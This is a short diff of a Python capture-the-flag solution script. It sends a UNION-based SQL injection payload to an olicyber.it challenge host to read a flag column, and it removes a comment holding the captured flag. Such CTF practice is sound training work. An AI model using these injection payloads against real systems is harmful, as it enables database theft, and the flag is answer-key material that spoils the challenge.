@@ -40,5 +40,3 @@ class Inj:
 inj = Inj('http://web-17.challs.olicyber.it/')
 response, error = inj.union("' UNION SELECT 1,2,3,4,id,flag FROM real_data-- ")
 print(response)
-
-# flag{Uni0ns_4re_so_tr1vi4l}
